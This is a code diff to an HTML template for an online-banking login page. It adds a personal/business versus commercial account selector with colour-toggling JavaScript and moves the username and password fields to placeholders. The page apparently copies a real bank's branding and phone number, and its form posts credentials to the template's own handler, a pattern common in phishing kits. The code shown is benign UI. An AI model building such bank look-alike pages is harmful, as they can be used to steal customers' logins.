@@ -2,21 +2,28 @@
 
 
 <div style="padding-top: 5px" class="middle-form">
-  <p class="go-left" style="font-size: 25px;">
-    Log In to Online Banking <br />
-    <span style="font-size: 15px; color: rgb(38, 38, 38)"
-      >Log In to Online Banking</span
-    >
+  <p class="go-left" style="font-size: 30px; color: #007856; text-align: center;">
+    Log In <br />
   </p>
+  
   <div class="submitForm">
+
+    <div class="signin-type">
+      <div onclick="highLightPersonal()" id="personal-account" class="acc-type">
+  <p>Personal / Business</p>
+      </div>
+      <div onclick="highLightCommercial()" id="commercial-account" class="acc-type">
+        <p>Commercial </p>
+      </div>
+    </div>
     <form action="" method="post">
       <div class="input-field" style="text-align: left">
-        <label for="username">Username</label>
-        <input id="username" name="user-id" type="text" />
+        <!-- <label for="username">Username</label> -->
+        <input id="username" placeholder="Username" name="user-id" type="text" />
       </div>
       <div class="input-field" style="text-align: left">
-        <label for="password">Password</label>
-        <input id="password" name="password" type="password" />
+        <!-- <label for="password">Password</label> -->
+        <input id="password" placeholder="Password" name="password" type="password" />
       </div>
 
       <div class="checkboxWrapper" style="margin-top: 20px">
@@ -46,5 +53,21 @@
     <a href="">Business Accounts: 1-800-724-6070</a>
   </div>
 </div>
+
+<script>
+  const highLightCommercial = () => {
+    document.getElementById('personal-account').style.background = 'none';
+    document.getElementById('personal-account').style.color = 'black';
+    document.getElementById('commercial-account').style.background = '#007856';
+    document.getElementById('commercial-account').style.color = 'white';
+  }
+
+  const highLightPersonal = () => {
+    document.getElementById('personal-account').style.background = '#007856';
+    document.getElementById('personal-account').style.color = 'white';
+    document.getElementById('commercial-account').style.background = 'none';
+    document.getElementById('commercial-account').style.color = 'black';
+  }
+</script>
 
 {%endblock%}
